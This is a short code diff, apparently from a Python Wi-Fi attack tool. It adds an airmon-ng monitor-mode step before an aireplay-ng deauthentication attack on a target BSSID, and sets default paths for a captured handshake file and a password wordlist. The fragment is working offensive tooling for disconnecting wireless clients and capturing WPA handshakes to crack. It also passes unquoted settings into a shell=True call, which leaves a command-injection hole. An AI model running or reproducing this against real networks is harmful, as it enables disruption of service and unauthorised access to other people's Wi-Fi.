@@ -94,7 +94,8 @@ def capture_hand_shake(settings):
 
     sleep(3)
 
-    command =  f"aireplay-ng --deauth 10 -a {settings['BSSID']} {settings['IFACE']};exit;"
+    command = f"airmon-ng start {settings['IFACE']} {settings['CHANNEL']};clear;"
+    command +=  f"aireplay-ng --deauth 10 -a {settings['BSSID']} {settings['IFACE']};exit;"
     call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
     print(colors.Green + '[✔]Deauthentication attack started' + colors.RESET)
 
@@ -133,10 +134,10 @@ def activate():
 
     saved_inputs_dict = {
         'IFACE':'wlan0',
-        'BSSID': '00:00:00:00:00:00:',
+        'BSSID': '00:11:22:33:44:55',
         'CHANNEL': '6',
-        'WORDLIST': f'{program_path}/handshakes/',
-        'HANDSHAKE': f'{program_path}/handshakes/'
+        'WORDLIST': f'{program_path}/handshakes/wordlist.txt',
+        'HANDSHAKE': f'{program_path}/handshakes/handshake.cap'
     }
 
     while True:
